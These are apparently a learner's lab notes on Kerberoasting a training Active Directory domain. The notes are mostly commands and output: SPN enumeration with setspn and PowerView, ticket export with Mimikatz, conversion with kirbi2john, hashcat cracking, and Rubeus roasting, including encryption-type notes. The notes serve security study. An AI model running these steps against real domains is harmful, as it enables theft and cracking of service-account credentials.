## Kerberoasting - Semi Manual method

Before tools such as `Rubeus` existed, stealing or forging Kerberos tickets was a complex, manual process.Let's begin with the built-in [setspn](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241\(v=ws.11\)) binary to enumerate SPNs in the domain.
#### Enumerating SPNs with setspn.exe

```cmd
C:\htb> setspn.exe -Q */*
```
![](Screenshot%202026-05-27%20at%2018.43.36.png)
#### Targeting a Single User

```powershell
PS C:\htb> Add-Type -AssemblyName System.IdentityModel 
PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```
![](Screenshot%202026-05-27%20at%2018.44.20.png)
#### Retrieving All Tickets Using setspn.exe

```powershell
PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```
![](Screenshot%202026-05-27%20at%2018.56.47.png)
## Extracting Tickets from Memory with Mimikatz

```cmd
Using 'mimikatz.log' for logfile : OK 

mimikatz # base64 /out:true 
isBase64InterceptInput is false 
isBase64InterceptOutput is true 

mimikatz # kerberos::list /export 

<SNIP>
```
#### Preparing the Base64 Blob for Cracking

```shell
3kjS@htb[/htb]$ echo "<base64 blob>" | tr -d \\n NUaIsVyDuYU/LZG4o2FS83CyLNiu/r2Lc2ZM8Ve/rqdd+TGxvUkr+5caNrPy2YHKRogzfsO8UQFU1anKW4ztEB1S+f4d1SsLkhYNI4q67cnCy00UEf4gOF6zAfieo91LDcryDpi1UII0SKIiT0yr9IQGR3TssVnl70acuNac6eCC+Ufvyd7g9gYH/9aBc8hSBp7RizrAcN2HFCVJontEJmCfBfCk0Ex23G8UULFic1w7S6/V9yj9iJvOyGElSk1VBRDMhC41712/sTraKRd7rw+fMkx7YdpMoU2dpEj9QQNZ3GRXNvGyQFkZp+sctI6Yx/vJYBLXI7DloCkzClZkp7c40u+5q/xNby7smpBpLToi5NoltRmKshJ9W19aAcb4TnPTfr <SNIP>
```
#### Placing the Output into a File as .kirbi

```shell
3kjS@htb[/htb]$ cat encoded_file | base64 -d > sqldev.kirbi
```

Next, we can use [this](https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py) version of the `kirbi2john.py` tool to extract the Kerberos ticket from the TGS file.
#### Extracting the Kerberos Ticket using kirbi2john.py

```shell
3kjS@htb[/htb]$ python2.7 kirbi2john.py sqldev.kirbi
```
#### Modifiying crack_file for Hashcat

```shell
3kjS@htb[/htb]$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
#### Viewing the Prepared Hash

```shell
3kjS@htb[/htb]$ cat sqldev_tgs_hashcat $krb5tgs$23$*sqldev.kirbi*$813149fb261549a6a1b4965ed49d1ba8$7a8c91b47c534bc258d5c97acf433841b2ef2478b425865dc75c39b1dce7f50dedcc29fc8a97aef8d51a22c5720ee614fcb646e28d854bcdc2c8b362b <SNIP>
```
#### Cracking the Hash with Hashcat

```shell
3kjS@htb[/htb]$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 

<SNIP> 

$krb5tgs$23$*sqldev.kirbi*$813149fb261549a6a1b4965
```
## Automated / Tool Based Route

#### Using PowerView to Enumerate SPN Accounts
```powershell
PS C:\htb> Import-Module .\PowerView.ps1 
PS C:\htb> Get-DomainUser * -spn | select samaccountname 

samaccountname 
-------------- 
adfs 
backupagent 
krbtgt 
sqldev 
sqlprod 
sqlqa 
solarwindsmonitor
```
#### Using PowerView to Target a Specific User

```powershell
PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```
![](Screenshot%202026-05-27%20at%2020.07.18.png)
#### Exporting All Tickets to a CSV File

```powershell
PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```
#### Viewing the Contents of the .CSV File

```powershell
PS C:\htb> cat .\ilfreight_tgs.csv 

"SamAccountName","DistinguishedName","ServicePrincipalName","TicketByteHexStream","Hash" "adfs","CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL","adfsconnect/azure01.inlanefreight.local",,"$krb5tgs$23$*adfs$INLANEFREIGHT.LOCAL$adfsconnect/azure01.inlanefreight.local*$59C086008BBE7EAE4E483506632F6EF8$622D9E1DBCB1FF2183482478B5559905E0CCBDEA2B52A5D9F510048481F2A3A4D2CC47345283A9E71D65E1573DCF6F2380A6FFF470722B5DEE704C51FF3A3C2CDB2945CA56F7763E117F04F26CA71EEACED25730FDCB06297ED4076C9CE1A1DBFE961DCE13C2D6455339D0D90983895D882CFA21656E41C3DDDC4951D1031EC8173BEEF9532337135A4CF70AE08F0FB34B6C1E3104F35D9B84E7DF7AC72F514BE2B346954C7F8C0748E46A28CCE765AF31628D3522A1E90FA187A124CA9D5F911318752082FF525B0BE1401FBA745E1 

<SNIP>
```
#### Using Rubeus

```powershell
PS C:\htb> .\Rubeus.exe
```
#### Using the /stats Flag

```powershell
PS C:\htb> .\Rubeus.exe kerberoast /stats
```
![](Screenshot%202026-05-27%20at%2020.09.41.png)
#### Using the /nowrap Flag

```powershell
PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```
![](Screenshot%202026-05-27%20at%2020.10.17.png)
## A Note on Encryption Types

```powershell
PS C:\htb> .\Rubeus.exe kerberoast /user:testspn /nowrap
```
![](Screenshot%202026-05-27%20at%2020.11.07.png)

```powershell
PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```
#### Cracking the Ticket with Hashcat & rockyou.txt

```shell
3kjS@htb[/htb]$ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt
```

Let's assume that our client has set SPN accounts to support AES 128/256 encryption.
![](Pasted%20image%2020260527201228.png)
If we check this with PowerView, we'll see that the `msDS-SupportedEncryptionTypes attribute` is set to `24`, meaning that AES 128/256 encryption types are the only ones supported.
#### Checking Supported Encryption Types

```powershell
PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```
#### Requesting a New Ticket

```powershell
PS C:\htb> .\Rubeus.exe kerberoast /user:testspn /nowrap
```
![](Screenshot%202026-05-27%20at%2020.13.28.png)
#### Running Hashcat & Checking the Status of the Cracking Job

```shell
3kjS@htb[/htb]$ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
```
#### Using the /tgtdeleg Flag
![](Pasted%20image%2020260527201422.png)

This can be done by opening Group Policy, editing the Default Domain Policy, and choosing: `Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options`, then double-clicking on `Network security: Configure encryption types allowed for Kerberos` and selecting the desired encryption type allowed for Kerberos.
![](Pasted%20image%2020260527202032.png)
## Mitigation & Detection
![](Pasted%20image%2020260527202219.png)
![](Pasted%20image%2020260527202227.png)
